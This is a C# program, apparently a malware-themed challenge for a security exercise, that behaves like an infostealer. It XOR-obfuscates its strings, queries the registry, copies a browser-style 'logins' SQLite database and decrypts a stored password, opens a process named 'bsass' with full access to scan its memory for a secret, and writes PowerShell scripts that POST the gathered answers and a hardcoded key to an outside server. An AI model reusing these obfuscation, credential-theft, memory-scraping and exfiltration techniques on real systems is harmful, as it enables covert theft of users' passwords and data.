using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Data.SQLite;
using System.Security.Cryptography;
using Newtonsoft.Json;
using System.IO;

class util
{
    public static string Deconfuse(byte[] key, byte[] cip)
    {
        if (key.Length != cip.Length)
            throw new Exception("length mismatch");

        byte[] outBuf = new byte[key.Length];
        for (int i = 0; i < key.Length; i++)
            outBuf[i] = (byte)(key[i] ^ cip[i]);

        return Encoding.Latin1.GetString(outBuf);
    }

    public static string get_bombe()
    {
        return Deconfuse(
            new byte[] { 0x98, 0x4C, 0xB6, 0xF3, 0xA1 },
            new byte[] { 0xFA, 0x23, 0xDB, 0x91, 0xC4 }
        );
    }

    public static string get_Submit_url()
    {
        return Deconfuse(
            new byte[] {
            0x45, 0x13, 0xC9, 0xA6, 0xE7, 0xA3, 0x98, 0x82, 0xDE, 0xC3,
            0x58, 0xEE, 0x31, 0x2B, 0x7A, 0x6B, 0x3B, 0xF3, 0x48, 0x64,
            0x98, 0x75, 0xB0, 0xB7, 0x8B, 0x39, 0x8D, 0x85, 0x5C, 0xBA,
            0xCE, 0x1E, 0xFA, 0xB8, 0x24, 0xD2, 0x8D
            },
            new byte[] {
            0x2D, 0x67, 0xBD, 0xD6, 0x94, 0x99, 0xB7, 0xAD, 0xAD, 0xB6,
            0x3A, 0x83, 0x58, 0x5F, 0x54, 0x09, 0x54, 0x9E, 0x2A, 0x01,
            0xB6, 0x01, 0xDF, 0xC7, 0xA4, 0x4A, 0xF8, 0xE7, 0x31, 0xD3,
            0xBA, 0x53, 0x9B, 0xD4, 0x65, 0xBC, 0xFE
            }
        );
    }

    public static string get_Ori_Path()
    {
        return Deconfuse(
            new byte[] {
            0x2B, 0x0D, 0xB0, 0xA6, 0xC7, 0x87, 0xEA, 0x7B, 0x84, 0xAF,
            0xD2, 0x65, 0xF1, 0x2D, 0xD3, 0x0A, 0xFB, 0x92, 0x93, 0x90,
            0x9D, 0xA1, 0xB1, 0x02, 0xE9, 0xA8, 0x87, 0xF5, 0x62, 0x64,
            0x3B, 0xC4, 0xAB, 0xAF, 0xFF, 0x7E, 0x31, 0xDE, 0x0A, 0x97,
            0xB5, 0xB6, 0x7C, 0x18, 0xC9, 0xF5
            },
            new byte[] {
            0x68, 0x37, 0xEC, 0xF3, 0xB4, 0xE2, 0x98, 0x08, 0xD8, 0xCD,
            0xBD, 0x08, 0x93, 0x48, 0x8F, 0x4B, 0x8B, 0xE2, 0xD7, 0xF1,
            0xE9, 0xC0, 0xED, 0x4E, 0x86, 0xCB, 0xE6, 0x99, 0x3E, 0x06,
            0x53, 0xB6, 0xC4, 0xC2, 0x9A, 0x22, 0x7D, 0xB1, 0x6D, 0xFE,
            0xDB, 0x96, 0x38, 0x79, 0xBD, 0x94
            }
        );
    }

    public static string get_Db_Path()
    {
        return Deconfuse(
            new byte[] {
            0xAD, 0x38, 0x19, 0xA2, 0x5F, 0x94, 0xB2, 0x2C, 0xC6, 0xA1,
            0x8D, 0x12, 0xF3, 0x41, 0x4A, 0xFC, 0xFA, 0x99, 0x23, 0x4E,
            0x98, 0x93, 0x7D, 0xFE, 0x46, 0x8A, 0x76, 0x8F, 0xC3, 0x38,
            0xC9, 0x01, 0xA4, 0x4F, 0xC8, 0xAF, 0x28, 0x23, 0x89, 0x91,
            0x79
            },
            new byte[] {
            0xEE, 0x02, 0x45, 0xF7, 0x2C, 0xF1, 0xC0, 0x5F, 0x9A, 0xE0,
            0xE9, 0x7F, 0x9A, 0x2F, 0x23, 0x8F, 0x8E, 0xEB, 0x42, 0x3A,
            0xF7, 0xE1, 0x21, 0xBA, 0x23, 0xF9, 0x1D, 0xFB, 0xAC, 0x48,
            0x95, 0x4D, 0xCB, 0x28, 0xA1, 0xC1, 0x08, 0x67, 0xE8, 0xE5,
            0x18
            }
        );
    }

    public static string get_powershell_exe()
    {
        return Deconfuse(
            new byte[] {
            0x7B, 0x2B, 0x73, 0x71, 0xBE, 0x0E, 0x24, 0x9F,
            0xBA, 0xFB, 0x67, 0x68, 0x6A, 0xEC
            },
            new byte[] {
            0x0B, 0x44, 0x04, 0x14, 0xCC, 0x7D, 0x4C, 0xFA,
            0xD6, 0x97, 0x49, 0x0D, 0x12, 0x89
            }
        );
    }
    public static string get_bsass()
    {
        return Deconfuse(
            new byte[] {
            0xf5, 0x2e, 0xd1, 0xd8, 0xbb
            },
            new byte[] {
            0x97, 0x5d, 0xb0, 0xab, 0xc8
            }
        );
    }

    public static string get_SOFTWARE_BOMBE()
    {
        return Deconfuse(
            new byte[] {
            0xC4, 0x15, 0x7A, 0x43, 0x4A, 0xC3, 0xBF,
            0xDC, 0x18, 0x5E, 0x30, 0x42, 0xC1, 0xF3
            },
            new byte[] {
            0x97, 0x5A, 0x3C, 0x17, 0x1D, 0x82, 0xED,
            0x99, 0x44, 0x1C, 0x7F, 0x0F, 0x83, 0xB6
            }
        );
    }

    public static void get_SOFTWARE_BOMBE_pair(out byte[] cip, out byte[] key)
    {
        cip = new byte[] {
            0xC4, 0x15, 0x7A, 0x43, 0x4A, 0xC3, 0xBF,
            0xDC, 0x18, 0x5E, 0x30, 0x42, 0xC1, 0xF3
        };
        key = new byte[] {
            0x97, 0x5A, 0x3C, 0x17, 0x1D, 0x82, 0xED,
            0x99, 0x44, 0x1C, 0x7F, 0x0F, 0x83, 0xB6
        };
    }

    public static string get_Flag_Format()
    {
        return Deconfuse(
            new byte[] {
            0x4A, 0x19, 0xF2, 0xF5, 0xB8, 0x24, 0x97, 0x3D, 0xD1, 0x04,
            0xD4, 0x94, 0x94, 0x36, 0x46, 0x73, 0x3A, 0x84, 0xA1, 0x1F, 0xC2
            },
            new byte[] {
            0x08, 0x56, 0xBF, 0xB7, 0xFD, 0x7B, 0xDA, 0x7C, 0x9D, 0x5B,
            0x92, 0xD8, 0xD5, 0x71, 0x19, 0x2F, 0x4D, 0xFF, 0x92, 0x2D, 0xBF
            }
        );
    }

    public static void get_Flag_Format_pair(out byte[] cip, out byte[] key)
    {
        cip = new byte[] {
        0x4A, 0x19, 0xF2, 0xF5, 0xB8, 0x24, 0x97, 0x3D, 0xD1, 0x04,
        0xD4, 0x94, 0x94, 0x36, 0x46, 0x73, 0x3A, 0x84, 0xA1, 0x1F, 0xC2
        };
        key = new byte[] {
        0x08, 0x56, 0xBF, 0xB7, 0xFD, 0x7B, 0xDA, 0x7C, 0x9D, 0x5B,
        0x92, 0xD8, 0xD5, 0x71, 0x19, 0x2F, 0x4D, 0xFF, 0x92, 0x2D, 0xBF
        };
    }

}

class Program
{
    //const string SECRET = "00000000000000000000000000000000";
    //const string testMAT = "BOMBE_MAL_FLAG";
    const string SECRET = "7jnNIqN714JROiTN9hLsBBq3hjo7aQCS";
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const int MEM_COMMIT = 0x1000;
    const int PAGE_READWRITE = 0x04;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public ulong RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern UIntPtr VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, UIntPtr dwLength);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    static int FindProcessIdByName(string processName)
    {
        foreach (Process proc in Process.GetProcessesByName(processName))
        {
            return proc.Id;
        }
        return -1;
    }

    static string ScanProcessMemory(string processName, byte[] pattern)
    {
        byte key = 0xcc;
        //for(int i = 0; i < pattern.Length; i++)
        //{
        //    pattern[i] = (byte)(pattern[i] ^ key);
        //}
        //Console.WriteLine("test:{0}", Encoding.UTF8.GetString(pattern));
        int pid = FindProcessIdByName(processName);

        if (pid == -1)
        {
            Console.WriteLine($"Process {processName} not found.");
            return null;
        }

        IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine($"Could not open process: {pid}");
            return null;
        }

        IntPtr address = IntPtr.Zero;
        MEMORY_BASIC_INFORMATION memoryInfo;
        Regex regex = new Regex((Encoding.UTF8.GetString(pattern)+"\\w{32}"));

        try
        {
            while (VirtualQueryEx(processHandle, address, out memoryInfo, (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != UIntPtr.Zero)
            {
                if (memoryInfo.State == MEM_COMMIT && memoryInfo.Protect == PAGE_READWRITE)
                {
                    byte[] buffer = new byte[memoryInfo.RegionSize];
                    if (ReadProcessMemory(processHandle, address, buffer, (UIntPtr)buffer.Length, out IntPtr bytesRead) && bytesRead.ToInt64() > 0)
                    {
                        for(int i = 0;i < buffer.Length; i++) {
                            buffer[i] = (byte)(buffer[i] ^ key);
                        }
                        string bufferString = System.Text.Encoding.UTF8.GetString(buffer);
                        Match match = regex.Match(bufferString);
                        if (match.Success)
                        {
                            return match.Value;
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Failed to read memory at address {address.ToString("X")}");
                    }
                }
                address = new IntPtr(address.ToInt64() + (long)memoryInfo.RegionSize);
            }
        }
        finally
        {
            CloseHandle(processHandle);
        }

        return null;
    }

    static byte[] HexStringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length / 2)
            .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
            .ToArray();
    }

    static byte[] DecryptPassword(byte[] encryptedPassword, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedPassword))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (System.IO.StreamReader srDecrypt = new System.IO.StreamReader(csDecrypt))
                    {
                        return Encoding.UTF8.GetBytes(srDecrypt.ReadToEnd());
                    }
                }
            }
        }
    }

    static string Challenge1()
    {
        //Console.WriteLine(testMAT);
        //return null;
        Process myProcess = Process.Start(util.get_powershell_exe(), "-c \"Get-ItemProperty HKLM:\\SOFTWARE\\* -EA SilentlyContinue | Where-Object { $_.PSObject.Properties.Name -contains 'answer_1' } | ForEach-Object { $_.answer_1 } > C:\\Users\\Administrator\\Desktop\\prob1.txt\"");
        if (myProcess != null)
        {
            myProcess.WaitForExit();
        }
        return null;
    }

    static string Challenge2()
    {
        //Console.WriteLine(testMAT);
        //return null;
        string decryptedPassword = null;
        string oriPath = util.get_Ori_Path();
        string dbPath = util.get_Db_Path();
        string command = $"-c \"cp \'{oriPath}\' \'{dbPath}\'\"";
        Process myProcess = Process.Start(util.get_powershell_exe(), command);

        if (myProcess != null)
        {
            myProcess.WaitForExit();
        }

        byte[] key = Encoding.UTF8.GetBytes(SECRET);

        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
        {
            conn.Open();
            using (SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
            {
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string originUrl = reader.GetString(0);
                        string username = reader.GetString(1);
                        string bombe = util.get_bombe();
                        if (username != bombe) continue;

                        byte[] encryptedPassword = HexStringToByteArray(reader.GetString(2));
                        //Console.WriteLine(encryptedPassword);
                        string outPath = @"C:\Users\Administrator\Desktop\prob2_enc.bin";
                        
                        File.WriteAllBytes(outPath, encryptedPassword);

                        string dec_script = @$"$all = [IO.File]::ReadAllBytes(""C:\Users\Administrator\Desktop\prob2_enc.bin"") 
$iv  = $all[0..15]
$cipher = $all[16..($all.Length-1)]

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = ""CBC""
$aes.Padding = ""PKCS7""
$secret = ""{SECRET}""
$key = [Text.Encoding]::UTF8.GetBytes($secret)
$aes.Key = $key
$aes.IV  = $iv

$dec = $aes.CreateDecryptor()
$plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)

[IO.File]::WriteAllText(
    ""C:\Users\Administrator\Desktop\prob2.txt"", 
    [Text.Encoding]::ASCII.GetString($plain)
)";
                        string script_path = @"C:\Users\Administrator\Desktop\prob2_script.ps1";
                        File.WriteAllText(script_path, dec_script);
                        myProcess = Process.Start(util.get_powershell_exe(), $"-c \"{script_path}\"");
                        if (myProcess != null)
                        {
                            myProcess.WaitForExit();
                        }
                        return null;
                        //try
                        //{
                        //    // Assuming the format of encryptedPassword is iv | ciphertext
                        //    byte[] iv = new byte[16]; // AES block size for CBC mode is 16 bytes
                        //    byte[] ciphertext = new byte[encryptedPassword.Length - iv.Length];
                        //    Buffer.BlockCopy(encryptedPassword, 0, iv, 0, iv.Length);
                        //    Buffer.BlockCopy(encryptedPassword, iv.Length, ciphertext, 0, ciphertext.Length);
                        //    return null;
                        //    byte[] decryptedPasswordBytes = DecryptPassword(ciphertext, key, iv);
                        //    for (int i = 0; i < decryptedPasswordBytes.Length; i++)
                        //    {
                        //        byte k = 0x77;
                        //        decryptedPasswordBytes[i] = (byte)(decryptedPasswordBytes[i] ^ k);
                        //    }
                        //    decryptedPassword = Encoding.UTF8.GetString(decryptedPasswordBytes);
                        //    return decryptedPassword;
                        //}
                        //catch (Exception)
                        //{
                        //    decryptedPassword = "Failed to decrypt";
                        //}
                        //return decryptedPassword;
                    }
                }
            }
        }
        return decryptedPassword;
    }

    static string Challenge3()
    {
        //return null;
        string processName = util.get_bsass();
        //xor 0xcc
        byte[] pattern = { 142, 131, 129, 142, 137, 147, 129, 141, 128, 147, 138, 128, 141, 139, 147};
        //string pattern = util.get_Flag_Format();
        string raw = ScanProcessMemory(processName, pattern);
        File.WriteAllBytes("C:\\Users\\Administrator\\Desktop\\prob3_front.txt", pattern);
        File.WriteAllText("C:\\Users\\Administrator\\Desktop\\prob3_back.txt", raw.Substring(15));
        string merge_script = @"$front = [IO.File]::ReadAllBytes(""C:\Users\Administrator\Desktop\prob3_front.txt"")
$back  = [IO.File]::ReadAllBytes(""C:\Users\Administrator\Desktop\prob3_back.txt"")

for ($i = 0; $i -lt $front.Length; $i++) {
    $front[$i] = $front[$i] -bxor 0xCC
}

$merged = New-Object byte[] ($front.Length + $back.Length)
[Array]::Copy($front, 0, $merged, 0, $front.Length)
[Array]::Copy($back,  0, $merged, $front.Length, $back.Length)
[IO.File]::WriteAllBytes(""C:\Users\Administrator\Desktop\prob3.txt"", $merged)
";
        string script_path = "C:\\Users\\Administrator\\Desktop\\prob3_merge_script.ps1";
        File.WriteAllText(script_path, merge_script);
        Process myProcess = Process.Start(util.get_powershell_exe(), $"-c \"{script_path}\"");
        if (myProcess != null)
        {
            myProcess.WaitForExit();
        }
        return null;
    }

    private static async Task SendAnswerToServer(string jsonPayload)
    {
        using (HttpClient client = new HttpClient())
        {
            StringContent content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            try
            {
                string url = util.get_Submit_url();
                HttpResponseMessage response = await client.PostAsync(url, content);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"Response: {responseBody}");
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"Request error: {e.Message}");
            }
        }
    }

    static async Task Main()
    {
        string answer_1 = Challenge1();
        Console.WriteLine(answer_1);
        string answer_2 = Challenge2();
        Console.WriteLine(answer_2);
        string answer_3 = Challenge3();
        Console.WriteLine(answer_3);

        string submitScript = $"Invoke-RestMethod -Uri https://submit.bombe.top/submitMalAns -Method POST -ContentType \"application/json\" `\r\n-Body \"{{`r`n`\r\n  `\"answer_1`\": `\"$(Get-Content ./prob1.txt)`\",`r`n`\r\n  `\"answer_2`\": `\"$(Get-Content ./prob2.txt)`\",`r`n`\r\n  `\"answer_3`\": `\"$(Get-Content ./prob3.txt)`\",`r`n`\r\n  `\"secret`\": `\"{SECRET}`\"`\r\n}}\"";
        string script_path = "C:\\Users\\Administrator\\Desktop\\submit_script.ps1";
        File.WriteAllText(script_path, submitScript);
        Process myProcess = Process.Start(util.get_powershell_exe(), $"-c \"{script_path}\"");
        if (myProcess != null)
        {
            myProcess.WaitForExit();
        }

        //await SendAnswerToServer(JsonConvert.SerializeObject(
        //    new
        //    {
        //        answer_1 = answer_1,
        //        answer_2 = answer_2,
        //        answer_3 = answer_3,
        //        secret = SECRET
        //    }
        //));
    }
}
